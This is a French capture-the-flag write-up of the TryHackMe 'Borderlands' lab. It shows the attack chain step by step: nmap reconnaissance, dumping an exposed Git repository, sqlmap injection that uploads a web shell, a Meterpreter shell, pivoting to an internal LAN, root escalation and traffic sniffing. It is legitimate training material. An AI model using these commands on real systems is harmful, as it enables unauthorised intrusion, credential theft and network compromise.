## TryHackMe: Borderlands

> **Objectif :** montrer pas à pas la méthodologie d’attaque: de la compromission du périmètre jusqu’au pivot réseau.

---

### 1 . Déploiement & Contexte

- Room : **Borderlands**: TryHackMe (difficulté : Hard)
- Topologie : un hôte périmétrique exposé à Internet, un réseau DMZ et un LAN interne derrière un routeur Linux.
- Outils : Kali Linux, Nmap, GitHack, Apktool, SQLMap, Metasploit.

---

### 2 . Reconnaissance réseau

```bash
sudo nmap -p- -sS -sV -A <IP-CIBLE>
```

| Port | Service | Détails utiles                          |
| ---- | ------- | --------------------------------------- |
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu                    |
| 80   | HTTP    | **nginx 1.14.0**: dépôt `.git/` exposé |
| 8080 | Closed  | (proxy)                                 |

> Le scan révèle une application PHP peu sécurisée et un dépôt Git accessible : excellent point d’entrée.

---

### 3 . Analyse du site web & clés API

1. **Dump du dépôt Git**

   ```bash
   python GitHack.py http://<IP-CIBLE>/.git/
   ```

   - Fichiers PHP & APK récupérés.
   - Historique : commit *“removed sensitive data”*.

2. **Extraction des clés**

| Clé       | Méthode                               | Valeur                           |
| --------- | ------------------------------------- | -------------------------------- |
| **AND\*** | Décompilation APK + Vigenère          | `ANDVOWLDLAS5Q8OQZ2tuIPGcOu2mXk` |
| **WEB\*** | Lecture directe `home.php`            | `WEBLhvOJAH8d50Z4y5G5g4McG1GMGD` |
| **GIT\*** | Inspection d’un commit (git cat-file) | `GITtFi80llzs4TxqMWtCotiTZpf0HC` |

---

### 4 . Injection SQL & Shell WebApp

1. **Détection SQLi**

   ```bash
   sqlmap -r request.txt --batch
   ```

   - Paramètre vulnérable : `documentid` (UNION, error‑based, time‑based).

2. **Shell PHP**

   ```bash
   sqlmap -r request.txt -D myfirstwebsite --os-shell
   ```

   - Upload d’un web‑shell (`tmpbsjex.php`).
   - Reverse Meterpreter → privilèges **www-data**.

3. **Flag WebApp**

   ```bash
   cat /var/www/flag.txt
   {FLAG:Webapp:48***a6}
   ```

---

### 5 . Pivot vers le réseau interne

| Interface | Adresse        | Rôle        |
| --------- | -------------- | ----------- |
| eth0      | 172.18.0.2/16  | DMZ         |
| eth1      | 172.16.1.10/24 | LAN interne |

- ARP : plusieurs hôtes 172.16.1.250‑254 ; routeur probable : **172.16.1.1**.

---

### 6 . Découverte & rebond

1. **Balayage ARP Python** → identification de 172.16.1.1.
2. **Port‑forward/Tunnel** (si nécessaire) avec SSH dynamique.

---

### 7 . Compromission de router1

- Escalade vers **root** (exploit Kernel/Sudo).
- **Flag Router1**
  ```bash
  cat /root/flag.txt
  {FLAG:Router1:c8***cd}
  ```

---

### 8 . Capture des communications internes

| Protocole | Commande                               | Flag                 |
| --------- | -------------------------------------- | -------------------- |
| UDP       | `tcpdump -i eth0 -A \| grep FLAG:TCP`  | `{FLAG:UDP:3b***3c}` |
| TCP       | `tcpdump -i eth0 -A \| grep FLAG:TCP`  | `{FLAG:TCP:8f***3e}` |

---

### 9 . Récapitulatif rapide

| Étape   | Outil               | Résultat            |
| ------- | ------------------- | ------------------- |
| Recon   | **Nmap**            | Ports 22/80         |
| Code    | **GitHack**         | Source + APK        |
| Mobile  | **Apktool**         | Clé AND             |
| Lecture | **grep**            | Clé WEB             |
| Git     | **git cat-file**    | Clé GIT             |
| Exploit | **SQLMap**          | Shell + Flag WebApp |
| Pivot   | ifconfig / ARP scan | Accès LAN           |
| Root    | Escalade kernel     | Flag Router1        |
| Sniff   | tcpdump / socat     | Flags UDP & TCP     |

---

### 10 . Conclusion

Cette room démontre qu’une démarche méthodique (recon → enum → exploit → pivot → post‑exploitation) reste efficace, même en difficulté *Hard*. Les dépôts Git oubliés, l’ingénierie inverse sur mobile et la surveillance réseau sont souvent sous‑estimés ; ils se révèlent pourtant décisifs pour une compromission complète.

---

***Auteur*** *: Saad Idrissi*
